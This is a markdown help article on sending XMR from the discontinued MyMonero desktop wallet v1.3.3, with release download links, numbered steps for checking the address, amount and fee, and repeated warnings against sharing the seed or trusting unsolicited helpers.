<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Send XMR with MyMonero</h1>
<p align="center">Verify the recipient, amount, and fee before confirming a transaction.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
MyMonero desktop’s final release v1.3.3 can still send XMR, though the app is no longer maintained. Before confirming, verify the destination address from a source you trust, check the amount and displayed fee, and never disclose your seed or private keys.

## You'll see this if
- You need to send XMR using the MyMonero desktop application.
- The wallet shows a balance but you are uncertain what is spendable.
- You are moving funds to a newly created wallet after migration.
- You want to avoid address substitution or a misleading support request.

## Why it happens
Sending XMR creates a transaction from the wallet to a destination address. It is different from restoring a seed in another application. Restoration gives access to the same wallet; sending or sweeping moves funds on-chain. The amount available to send can depend on wallet status, synchronization, and fees shown by the app.

MyMonero desktop v1.3.3 still opens wallets and sends XMR, but is no longer maintained and has no new features or security updates. MyMonero hosted servers and web wallet login stopped. The alternative described here is Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. For moving funds specifically, see [sweeping funds to a new wallet](./mymonero-sweep-funds-new-wallet.md).

A seed phrase or private key is not a transaction detail to share with a recipient or support agent. Nobody legitimate asks for the seed to process a send. Treat requests for recovery words, remote access, or a substituted recipient address as warning signs. Review the broader [migration checklist](./mymonero-migration-checklist.md) if this send is part of a wallet move.

---

## Fix
1. **Confirm that sending is your goal.** If you only want to view the same wallet in Cake Wallet, restoring the seed does not require a transaction. Send only when you intend to pay a recipient or move funds to a separate wallet.
2. **Open the wallet you control.** Use the MyMonero desktop app or the restored wallet you deliberately chose. Do not let a stranger remotely operate the wallet. If the balance has not synchronized, wait and check status before sending.
3. **Check spendable funds.** A displayed total may not equal the amount currently available to send. Review any locked or pending status and avoid repeatedly submitting transactions. If availability appears low, consult [spendable balance guidance](./mymonero-spendable-balance-low.md).
4. **Obtain the recipient address independently.** For a person or service, get the intended address through a channel you trust and verify it against the recipient’s own information. For your own new wallet, copy the address directly from that wallet. Do not rely on an unsolicited message or an address read aloud by a supposed helper.
5. **Enter the transaction details.** Use the wallet’s send flow. Enter the destination and intended amount carefully. For a send-all operation, use the wallet’s sweep or send-all function and understand that the fee affects what is sent.
6. **Review the address character by character where practical.** Compare the destination displayed in MyMonero with the one shown by the recipient or receiving wallet. If they differ, cancel and verify again. Do not proceed simply because someone claims an unfamiliar address is an upgrade or verification address.
7. **Inspect amount and fee.** Confirm the amount is what you intend and review the fee shown in the wallet. The transaction should not require revealing a seed. If a fee or warning is unclear, pause and consult trusted documentation rather than guessing.
8. **Confirm once you are satisfied.** Submit only from your own wallet and device. Avoid multiple attempts while the first one may still be processing. Keep any transaction reference private enough to avoid exposing more information than needed.
9. **Monitor status.** Allow the wallet to reflect the transaction and check its status. A delay does not by itself prove failure. Do not send the same amount again just because the display has not refreshed.

> [!TIP]
> When sending to a new wallet you control, open that wallet yourself and compare the destination address before confirming. This is safer than trusting an address copied from a third party.

> [!WARNING]
> Transactions may not be reversible. Never send funds to an address supplied by an unsolicited “recovery” agent, and never share your seed or private keys.

## If that did not work
If the send action is unavailable or the wallet reports insufficient spendable funds, check synchronization and any locked or pending state. Do not infer that the total balance is ready to send. See [spendable balance low](./mymonero-spendable-balance-low.md) and wait for the wallet’s status to update.

If a submitted transaction does not appear, give the wallet time and check its status before trying again. A connection problem, including error 523, is general guidance that a server connection is unavailable; it does not prove the transaction failed. See [transaction not showing](./mymonero-transaction-not-showing.md) for cautious checks.

If an address seems to change unexpectedly, stop and cancel. Re-obtain it directly from the intended recipient or receiving wallet. Do not accept directions to send a test or “unlocking” payment to an address you cannot independently verify. A genuine helper does not need your recovery phrase to review the steps.

## Prevention
Keep the wallet seed private and backed up offline. Before each send, verify the destination, amount, and fee on your own screen. For a migration, decide whether you need a seed restore or a separate transaction. Check the receiving wallet address independently and avoid rushing after unsolicited messages. MyMonero desktop remains usable for sending, but it is unmaintained; the final release is available on the [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Treat that status as part of your ongoing software decision.

## FAQ
<details><summary>Does restoring a seed send XMR?</summary>

No. Restoring gives access to the same wallet. A transaction is required to send funds elsewhere.

</details>

<details><summary>Should I provide my seed to support?</summary>

No. Nobody legitimate asks for your seed or private keys to help with a send.

</details>

<details><summary>Why can I not send the full displayed balance?</summary>

Some funds may not be spendable yet, and a fee may apply. Check wallet status and review the amount shown before confirmation.

</details>

<details><summary>Can I still send from MyMonero desktop?</summary>

The old app still sends XMR, but its final release v1.3.3 is no longer maintained and has no new security updates.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Withdraw XMR From MyMonero to an Exchange](./mymonero-withdraw-to-exchange.md) | How to send Monero safely from the desktop wallet to an exchange deposit address. |
| [Restore a MyMonero Wallet](./restore-mymonero-wallet.md) | Recover access by restoring a compatible seed in MyMonero desktop or Cake Wallet. |
| [MyMonero Balance Shows Zero](./mymonero-balance-shows-zero.md) | Check wallet selection, scanning, restore height, and connection before concluding funds are missing. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
